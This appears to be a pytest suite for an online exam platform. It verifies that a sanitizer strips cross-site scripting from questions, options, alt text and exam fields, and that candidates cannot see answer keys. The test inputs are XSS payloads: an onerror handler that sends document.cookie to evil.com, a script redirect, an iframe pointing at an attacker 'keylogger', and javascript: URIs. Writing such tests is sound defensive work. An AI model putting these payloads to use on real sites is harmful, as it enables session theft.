import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.main import app
from app.api.deps import get_db
from app.db.base import Base
from app.core.permissions import RoleEnum
from app.core.security import get_password_hash, create_access_token
from app.models.user import User
from app.models.role import Role, UserRole
from app.models.organization import Organization
from app.models.exam import Exam, ExamStatus
from app.models.question import Question
from app.models.question_version import QuestionVersion
from app.models.section import ExamSection, SectionQuestion
from app.schemas.question import QuestionCreate, QuestionOptionSchema, AccessibilityMetadataSchema
from app.schemas.exam import ExamCreate, ExamUpdate, SectionCreate
from app.services.question_service import create_question, get_candidate_sanitized_question
from app.services.exam_service import create_exam, update_exam, add_section_to_exam
from app.utils.sanitizer import (
    sanitize_text,
    sanitize_options,
    sanitize_accessibility_metadata,
)


@pytest.fixture(scope="module")
def p3_env():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    TestingSession = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    db = TestingSession()

    def override_get_db():
        session = TestingSession()
        try:
            yield session
        finally:
            session.close()

    app.dependency_overrides[get_db] = override_get_db

    # Roles
    admin_role = Role(id="role-admin", name=RoleEnum.ADMIN.value, description="System Admin")
    candidate_role = Role(id="role-cand", name=RoleEnum.CANDIDATE.value, description="Candidate")
    examiner_role = Role(id="role-exam", name=RoleEnum.EXAMINER.value, description="Examiner")
    db.add_all([admin_role, candidate_role, examiner_role])
    db.flush()

    # Org
    org = Organization(id="org-sec-3", name="Security Integrity Center")
    db.add(org)
    db.flush()

    # Users
    examiner_user = User(
        id="exam-user-3",
        email="examiner.sec3@gowow.org",
        password_hash=get_password_hash("ExaminerP3!Pass"),
        first_name="Examiner",
        last_name="Three",
        is_active=True,
    )
    candidate_user = User(
        id="cand-user-3",
        email="candidate.sec3@gowow.org",
        password_hash=get_password_hash("CandidateP3!Pass"),
        first_name="Candidate",
        last_name="Three",
        is_active=True,
    )
    db.add_all([examiner_user, candidate_user])
    db.flush()

    db.add(UserRole(user_id=examiner_user.id, role_id=examiner_role.id))
    db.add(UserRole(user_id=candidate_user.id, role_id=candidate_role.id))
    db.commit()

    examiner_token = create_access_token(
        subject=examiner_user.id,
        role=RoleEnum.EXAMINER.value,
    )
    candidate_token = create_access_token(
        subject=candidate_user.id,
        role=RoleEnum.CANDIDATE.value,
    )

    client = TestClient(app)

    yield {
        "db": db,
        "client": client,
        "examiner_user": examiner_user,
        "candidate_user": candidate_user,
        "examiner_token": examiner_token,
        "candidate_token": candidate_token,
        "org_id": org.id,
    }

    app.dependency_overrides.clear()


# ============================================================================
# Unit Tests: Sanitizer Module
# ============================================================================

def test_sanitizer_removes_script_tags():
    raw = "<p>What is the integral of <script>alert('xss')</script> x^2 dx?</p>"
    cleaned = sanitize_text(raw)
    assert "<script>" not in cleaned
    assert "alert('xss')" not in cleaned
    assert "<p>What is the integral of  x^2 dx?</p>" == cleaned


def test_sanitizer_removes_event_handlers():
    raw = '<img src="diagram.png" alt="Force vector" onerror="fetch(\'http://evil.com?c=\'+document.cookie)">'
    cleaned = sanitize_text(raw)
    assert "onerror" not in cleaned
    assert "evil.com" not in cleaned
    assert 'alt="Force vector"' in cleaned
    assert '<img src="diagram.png"' in cleaned


def test_sanitizer_removes_javascript_uri():
    raw = '<a href="javascript:alert(document.domain)">Click here for formula</a>'
    cleaned = sanitize_text(raw)
    assert "javascript:" not in cleaned
    assert "alert" not in cleaned


def test_sanitizer_removes_iframes_and_objects():
    raw = 'Question prompt <iframe src="https://attacker.site/keylogger"></iframe> Solve for y.'
    cleaned = sanitize_text(raw)
    assert "<iframe" not in cleaned
    assert "attacker.site" not in cleaned
    assert "Question prompt  Solve for y." == cleaned


def test_sanitizer_preserves_safe_accessible_markup_and_math():
    raw = (
        "<p>Calculate the <strong>acceleration</strong> using formula:</p>"
        "<table><thead><tr><th>Time (s)</th><th>Velocity (m/s)</th></tr></thead>"
        "<tbody><tr><td>0</td><td>0</td></tr><tr><td>5</td><td>25</td></tr></tbody></table>"
        "<code>a = \\Delta v / \\Delta t</code>"
    )
    cleaned = sanitize_text(raw)
    assert "<strong>acceleration</strong>" in cleaned
    assert "<th>Time (s)</th>" in cleaned
    assert "<code>a = \\Delta v / \\Delta t</code>" in cleaned


# ============================================================================
# Integration Tests: Question & Exam Creation Sanitization
# ============================================================================

def test_create_question_sanitizes_xss(p3_env):
    db = p3_env["db"]
    examiner_id = p3_env["examiner_user"].id

    q_data = QuestionCreate(
        question_type="single_choice",
        subject="Computer Security",
        topic="Web Vulnerabilities",
        difficulty="medium",
        language="en",
        question_text="Identify the vulnerability: <script>document.location='http://evil.com'</script> in input.",
        options=[
            QuestionOptionSchema(id="opt1", label="A", text="Reflected XSS <img src=x onerror=alert(1)>"),
            QuestionOptionSchema(id="opt2", label="B", text="SQL Injection"),
        ],
        correct_answer="opt1",
        explanation="The script tag executes in browser context. <iframe src='exploit.html'></iframe>",
        marks=2.0,
        negative_marks=0.5,
        accessibility_metadata=AccessibilityMetadataSchema(
            has_alt_text=True,
            alt_text="Diagram showing request flow <script>alert(1)</script>",
        ),
    )

    created = create_question(db, q_data, examiner_id)
    assert "<script>" not in created.question_text
    assert "evil.com" not in created.question_text
    assert "onerror" not in created.options[0].text
    assert "<iframe" not in (created.explanation or "")
    assert "<script>" not in created.accessibility_metadata.alt_text


def test_create_exam_and_section_sanitizes_xss(p3_env):
    db = p3_env["db"]
    examiner_id = p3_env["examiner_user"].id
    org_id = p3_env["org_id"]

    exam_data = ExamCreate(
        organization_id=org_id,
        title="Midterm Exam <script>stealToken()</script>",
        description="Instructions with <img src=x onerror=console.log('pwned')>",
        instructions="Please read instructions <a href='javascript:exploit()'>here</a>.",
        duration_seconds=3600,
        language="en",
    )

    exam = create_exam(db, exam_data, examiner_id)
    assert "<script>" not in exam.title
    assert "stealToken" not in exam.title
    assert "onerror" not in (exam.description or "")
    assert "javascript:" not in (exam.instructions or "")


# ============================================================================
# API Security Tests: Candidate Question Detail Strips Answer Keys
# ============================================================================

def test_candidate_sanitized_question_hides_answers(p3_env):
    db = p3_env["db"]
    examiner_id = p3_env["examiner_user"].id

    q_data = QuestionCreate(
        question_type="single_choice",
        subject="Physics",
        topic="Mechanics",
        difficulty="easy",
        language="en",
        question_text="What is the unit of force in SI units?",
        options=[
            QuestionOptionSchema(id="opt_a", label="A", text="Newton"),
            QuestionOptionSchema(id="opt_b", label="B", text="Joule"),
        ],
        correct_answer="opt_a",
        explanation="Force is measured in Newtons (N), where 1 N = 1 kg*m/s^2.",
        marks=1.0,
        negative_marks=0.25,
    )
    created = create_question(db, q_data, examiner_id)

    # Candidate view must NOT contain correct_answer or explanation
    candidate_view = get_candidate_sanitized_question(db, created.id)
    cand_dict = candidate_view.model_dump()
    assert "correct_answer" not in cand_dict
    assert "explanation" not in cand_dict
    assert candidate_view.question_text == "What is the unit of force in SI units?"


def test_mock_test_api_sanitizes_questions(p3_env):
    client = p3_env["client"]
    token = p3_env["candidate_token"]

    # Candidate fetches mock test questions
    resp = client.get(
        "/api/v1/mock-tests/test-ai-01",
        headers={"Authorization": f"Bearer {token}"},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert "sections" in data

    # Verify that NO question in any section exposes correct answers or explanations
    for section in data["sections"]:
        for question in section.get("questions", []):
            assert "correct_answer" not in question
            assert "correctOptionIds" not in question
            assert "explanation" not in question
